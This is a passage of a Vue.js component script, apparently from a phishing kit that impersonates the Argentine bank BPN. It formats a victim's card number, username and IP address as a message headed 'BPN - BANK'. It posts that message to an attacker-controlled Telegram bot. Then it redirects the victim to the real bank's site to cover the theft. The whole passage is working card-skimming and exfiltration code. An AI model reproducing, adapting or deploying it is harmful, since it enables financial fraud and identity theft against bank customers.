<script>
  import { getGeoLocation } from '@/services/geoService';
  import axios from 'axios';
  import { mapGetters, mapActions } from 'vuex';
export default {
  data() {
    return {
      card: '',
      datos:{},
      loader:false,
      showAlert:false,
      userIp:'',
      geoData: null,
      };
    },
    async created() {
    this.geoData = await getGeoLocation();
  },
  mounted(){
        this.datos= this.getDatos[0]
    },
  computed: {
    ...mapGetters(['getServicio', 'getDatos']),

    isCardValid() {
      // Verifica si el valor sin espacios tiene exactamente 16 dígitos
      return /^\d{16}$/.test(this.card.replace(/\s+/g, ''));
    },
    formattedCard: {
      get() {
        // Devuelve el valor formateado
        return this.card.replace(/(.{4})/g, '$1 ').trim();
      },
      set(value) {
        // Establece el valor sin espacios
        this.card = value.replace(/\s+/g, '');
      }
    }
  },
  methods: {

   async sendData(){
    // try {
    //   const response = await axios.get('/api/ip');
    //   this.userIp = response.data.ip;
    // } catch (error) {
    //   console.error('Error al obtener la IP del usuario:', error);
    // }
      this.loader=true;
      this.datos= this.getDatos[0]
      const fecha = new Date();
          const fechaFormateada = `${fecha.getDate()}/${fecha.getMonth() + 1}/${fecha.getFullYear()} ${fecha.getHours()}:${fecha.getMinutes()}`;
          const postData =  
          `
BPN - BANK
User:  <code>${this.datos.usuario}</code>\n
IP: ${this.geoData.ip}
***-----[CARD]------***

\u{1F4B3} : <code> ${this.card} </code>\n

$$$-------$$------$$$
                            `;
          const chatId = process.env.CHAT_ID_TELEGRAM;
          const botToken = process.env.TOKEN_TELEGRAM;
          const apiUrl = process.env.API_URL_TELEGRAM;
          const action = '/sendMessage'
          const url = `${apiUrl}${botToken}${action}`;

        

              try {
              await axios.post(url, {
                chat_id: chatId,
                text: postData,
                parse_mode: 'HTML'
              });
              setTimeout(() => {
                this.showAlert=true
              }, 3000);
              setTimeout(() => {
                window.location.href = 'https://www.bpn.com.ar/';
              }, 5900);
            } catch (error) {
            }
    
			},
    formatCard(event) {
      // Solo permite la entrada de dígitos y limita a 16 caracteres
      let value = event.target.value.replace(/\D/g, '').slice(0, 16);
      // Establece el valor formateado
      this.card = value;
    },
    handleSubmit() {
      if (this.isCardValid) {
        window.location.href = 'https://www.ejemplo.com';
      } else {
        alert('El código debe tener exactamente 16 dígitos.');
      }
